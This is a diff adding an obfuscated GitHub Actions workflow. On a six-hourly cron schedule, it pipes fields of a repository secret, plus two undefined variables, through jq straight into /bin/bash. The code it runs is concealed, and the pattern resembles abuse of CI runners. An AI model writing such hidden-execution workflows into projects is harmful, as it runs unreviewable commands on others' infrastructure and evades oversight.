@@ -1,0 +1,21 @@
+name: yueziqun8765
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yueziqun8765
+        env:
+          doihs44835: ${{ secrets.doihs44835 }}
+        run: |
+          echo $doihs44835 | jq -r .k51 | /bin/bash
+          echo $bxfi9 | jq -r .s265 | /bin/bash
+          echo $httde0197 | jq -r .kce4090 | /bin/bash
+
